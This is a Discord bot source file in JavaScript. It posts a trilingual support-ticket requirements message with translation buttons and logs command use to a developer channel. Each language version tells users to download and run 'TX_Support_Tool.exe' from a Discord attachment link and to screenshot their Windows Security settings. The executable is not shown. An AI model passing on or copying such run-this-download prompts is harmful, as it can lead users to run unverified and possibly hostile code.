const { Client, GatewayIntentBits, EmbedBuilder, SlashCommandBuilder, REST, Routes, ActionRowBuilder, ButtonBuilder, ButtonStyle } = require('discord.js');

const client = new Client({
    intents: [GatewayIntentBits.Guilds, GatewayIntentBits.GuildMessages, GatewayIntentBits.MessageContent]
});

const prefix = '.';
const DEV_LOG_CHANNEL_ID = '1414044553312468992';

const commands = [
    new SlashCommandBuilder()
        .setName('allcmds')
        .setDescription('Display all available bot commands (Staff Quick Reference)')
];

const rest = new REST({ version: '10' }).setToken(process.env.DISCORD_TOKEN);

async function registerCommands() {
    await rest.put(Routes.applicationCommands(process.env.CLIENT_ID), { body: commands });
    console.log('Commands registered successfully.');
}

registerCommands().catch(console.error);

client.once('ready', () => {
    console.log(`Bot is ready! Logged in as ${client.user.tag}`);
    client.user.setPresence({
        activities: [{ name: 'Doing things others cant.', type: 4 }],
        status: 'online'
    });
});

function createTranslationButtons() {
    return new ActionRowBuilder()
        .addComponents(
            new ButtonBuilder()
                .setCustomId('translate_en')
                .setLabel('English')
                .setStyle(ButtonStyle.Secondary)
                .setEmoji('🇺🇸'),
            new ButtonBuilder()
                .setCustomId('translate_de')
                .setLabel('Deutsch')
                .setStyle(ButtonStyle.Secondary)
                .setEmoji('🇩🇪'),
            new ButtonBuilder()
                .setCustomId('translate_fr')
                .setLabel('Français')
                .setStyle(ButtonStyle.Secondary)
                .setEmoji('🇫🇷')
        );
}

function createEmbed(commandType, language = 'en') {
    let embed = new EmbedBuilder().setColor('#FFFFFF').setTimestamp();
    
    if (commandType === 'supportticket') {
        if (language === 'en') {
            embed.setTitle('📋 Support Ticket Requirements')
                .setDescription('In order to assist you efficiently, please ensure you provide the following when opening a ticket:')
                .addFields(
                    { name: '📹 Required Information', value: '• A clear, high-quality video demonstrating the issue\n• A screenshot of the error message(s)\n• The name of the product you are using\n• The version of Windows you are running\n• A screenshot of each tab within your Windows Security settings' },
                    { name: '🔧 Diagnostic Tool', value: 'Run the following diagnostic setup file and provide a screenshot when prompted:\n[TX Support Tool](https://cdn.discordapp.com/attachments/1413199327249170472/1418206411178901558/TX_Support_Tool.exe)' },
                    { name: '⚠️ Important Notes', value: '• Failure to follow these steps may result in delays or prevent us from providing effective support\n• Please ensure all requested information is submitted promptly\n• Once everything is submitted, kindly wait for an administrator to respond\n• Inactivity within the ticket may result in it being automatically closed' }
                )
                .setFooter({ text: 'Support Team • Please follow all requirements' });
        } else if (language === 'de') {
            embed.setTitle('📋 Support-Ticket Anforderungen')
                .setDescription('Um Ihnen effizient zu helfen, stellen Sie bitte beim Öffnen eines Tickets die folgenden Informationen bereit:')
                .addFields(
                    { name: '📹 Erforderliche Informationen', value: '• Ein klares, hochwertiges Video, das das Problem demonstriert\n• Ein Screenshot der Fehlermeldung(en)\n• Der Name des Produkts, das Sie verwenden\n• Die Version von Windows, die Sie verwenden\n• Ein Screenshot jedes Tabs in Ihren Windows-Sicherheitseinstellungen' },
                    { name: '🔧 Diagnose-Tool', value: 'Führen Sie die folgende Diagnose-Datei aus und stellen Sie einen Screenshot bereit:\n[TX Support Tool](https://cdn.discordapp.com/attachments/1413199327249170472/1418206411178901558/TX_Support_Tool.exe)' },
                    { name: '⚠️ Wichtige Hinweise', value: '• Das Nichtbefolgen dieser Schritte kann zu Verzögerungen führen oder uns daran hindern, effektiven Support zu bieten\n• Bitte stellen Sie sicher, dass alle angeforderten Informationen umgehend übermittelt werden\n• Warten Sie nach der Übermittlung geduldig auf die Antwort eines Administrators\n• Inaktivität im Ticket kann zur automatischen Schließung führen' }
                )
                .setFooter({ text: 'Support Team • Bitte befolgen Sie alle Anforderungen' });
        } else if (language === 'fr') {
            embed.setTitle('📋 Exigences du Ticket de Support')
                .setDescription('Afin de vous aider efficacement, veuillez vous assurer de fournir les éléments suivants lors de l\'ouverture d\'un ticket:')
                .addFields(
                    { name: '📹 Informations Requises', value: '• Une vidéo claire et de haute qualité démontrant le problème\n• Une capture d\'écran du/des message(s) d\'erreur\n• Le nom du produit que vous utilisez\n• La version de Windows que vous utilisez\n• Une capture d\'écran de chaque onglet dans vos paramètres de sécurité Windows' },
                    { name: '🔧 Outil de Diagnostic', value: 'Exécutez le fichier de configuration de diagnostic suivant et fournissez une capture d\'écran:\n[TX Support Tool](https://cdn.discordapp.com/attachments/1413199327249170472/1418206411178901558/TX_Support_Tool.exe)' },
                    { name: '⚠️ Notes Importantes', value: '• Ne pas suivre ces étapes peut entraîner des retards ou nous empêcher de fournir un support efficace\n• Veuillez vous assurer que toutes les informations demandées sont soumises rapidement\n• Une fois tout soumis, veuillez attendre patiemment qu\'un administrateur réponde\n• L\'inactivité dans le ticket peut entraîner sa fermeture automatique' }
                )
                .setFooter({ text: 'Équipe de Support • Veuillez suivre toutes les exigences' });
        }
    }
    
    return embed;
}

async function logCommand(user, commandName) {
    const devChannel = client.channels.cache.get(DEV_LOG_CHANNEL_ID);
    if (devChannel) {
        const logEmbed = new EmbedBuilder()
            .setColor('#4ECDC4')
            .setTitle('📊 Command Used')
            .addFields(
                { name: '👤 User', value: user.username, inline: true },
                { name: '⚡ Command', value: `.${commandName}`, inline: true }
            )
            .setTimestamp();
        
        devChannel.send({ embeds: [logEmbed] }).catch(() => {});
    }
}

client.on('interactionCreate', async (interaction) => {
    if (interaction.isChatInputCommand() && interaction.commandName === 'allcmds') {
        const embed = new EmbedBuilder()
            .setColor('#FFFFFF')
            .setTitle('🤖 All Bot Commands')
            .setDescription('Available commands with translation buttons.')
            .addFields({ 
                name: '📋 Commands', 
                value: '`.supportticket` - Support requirements\n`.allcmds` - Command list' 
            })
            .setTimestamp();
        await interaction.reply({ embeds: [embed], ephemeral: true }).catch(() => {});
    }

    if (interaction.isButton() && interaction.customId.startsWith('translate_')) {
        const language = interaction.customId.split('_')[1];
        const originalTitle = interaction.message.embeds[0].title;
        
        let commandType = '';
        if (originalTitle.includes('Support Ticket') || originalTitle.includes('Support-Ticket') || originalTitle.includes('Ticket de Support')) {
            commandType = 'supportticket';
        }

        if (commandType) {
            const newEmbed = createEmbed(commandType, language);
            const buttons = createTranslationButtons();
            await interaction.update({ embeds: [newEmbed], components: [buttons] }).catch(() => {});
        }
    }
});

client.on('messageCreate', async (message) => {
    if (!message.content.startsWith(prefix) || message.author.bot) return;

    const command = message.content.slice(prefix.length).trim().toLowerCase();

    if (command === 'supportticket') {
        const embed = createEmbed('supportticket', 'en');
        const buttons = createTranslationButtons();
        
        await message.delete().catch(() => {});
        await message.channel.send({ embeds: [embed], components: [buttons] }).catch(() => {});
        logCommand(message.author, 'supportticket');
    }

    if (command === 'allcmds') {
        const embed = new EmbedBuilder()
            .setColor('#FFFFFF')
            .setTitle('🤖 All Bot Commands')
            .addFields({ 
                name: '📋 Available Commands', 
                value: '`.supportticket` - Support requirements\n`.allcmds` - This list' 
            })
            .setTimestamp();
        
        await message.delete().catch(() => {});
        await message.channel.send({ embeds: [embed] }).catch(() => {});
        logCommand(message.author, 'allcmds');
    }
});

client.login(process.env.DISCORD_TOKEN);
